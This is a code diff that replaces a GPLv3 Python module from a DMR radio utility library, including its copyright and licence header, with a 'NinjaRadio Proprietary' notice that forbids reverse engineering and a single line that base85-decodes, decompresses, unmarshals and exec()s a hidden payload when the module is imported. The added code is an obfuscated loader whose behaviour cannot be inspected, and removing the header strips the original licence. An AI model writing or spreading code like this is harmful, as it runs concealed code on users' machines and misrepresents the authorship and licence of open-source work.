@@ -1,38 +1,5 @@
-#!/usr/bin/env python
-#
-###############################################################################
-#   Copyright (C) 2016-2018  Cortney T. Buffington, N0MJS <n0mjs@me.com>
-#
-#   This program is free software; you can redistribute it and/or modify
-#   it under the terms of the GNU General Public License as published by
-#   the Free Software Foundation; either version 3 of the License, or
-#   (at your option) any later version.
-#
-#   This program is distributed in the hope that it will be useful,
-#   but WITHOUT ANY WARRANTY; without even the implied warranty of
-#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-#   GNU General Public License for more details.
-#
-#   You should have received a copy of the GNU General Public License
-#   along with this program; if not, write to the Free Software Foundation,
-#   Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301  USA
-###############################################################################
-
-
-from bitarray import bitarray
-from dmr_utils3 import const
-
-# Does anybody read this stuff? There's a PEP somewhere that says I should do this.
-__author__     = 'Cortney T. Buffington, N0MJS'
-__copyright__  = 'Copyright (c) 2016-2018 Cortney T. Buffington, N0MJS and the K0USY Group'
-__license__    = 'GNU GPLv3'
-__maintainer__ = 'Cort Buffington, N0MJS'
-__email__      = 'n0mjs@me.com'
-
-
-#------------------------------------------------------------------------------
-# Used to execute the module directly to run built-in tests
-#------------------------------------------------------------------------------
-
-if __name__ == '__main__':
-    pass
+# -*- coding: utf-8 -*-
+# NinjaRadio Proprietary Architecture - All Rights Reserved
+# Unauthorized copying, reverse engineering or distribution is strictly prohibited.
+import zlib, marshal, base64
+exec(marshal.loads(zlib.decompress(base64.b85decode('c-nnX&r94u6rM@4YqG9O*Mp#}?Hn7h5-W%Y5m8}_wo75_q3L0oW=1!fnUTpv*qn0oKj`1k|7Pha?6s%f0^U6NVq36KI=t`A_kMiy9`ge|Io9v{?hxEp#1O+N5-3Et;Z}-;6<WaU&}L5PuvXY&?Xb-j!UgU!_v%rvE#{3;1HbdLN%(l~eo0KEbu<Ouij~YvF*s7%NIoSWHpyXrexAq+qvQq|1@BJA#hW8_J=Mv@#E_S<PhJOGJFmd)lK-hlBpERiPELcf@kcV$D!(qg;pmJE-@m=tE>;@xKZbQ>ATF~5!8c<i<}RfoN+hKt-_thiKkqQ1X>O7<+t$uwg3>5A6QwDgFHsu**%iV?O4B6fGUE{Rem!LXyy^8Q<&a2$!W0<^X!?fknoqj#?#V=6Mml1N+P`=AgkpKh_w_R<VnFs8Ty0~F>kWjT&(Qi)tI%Nfx7BU59F(1^|EXN6`h#+@>icD{>c1$xx`&+ZZSmb+o!P6E<Ce#@jhr<IbPt9+0HTPR?f'))))
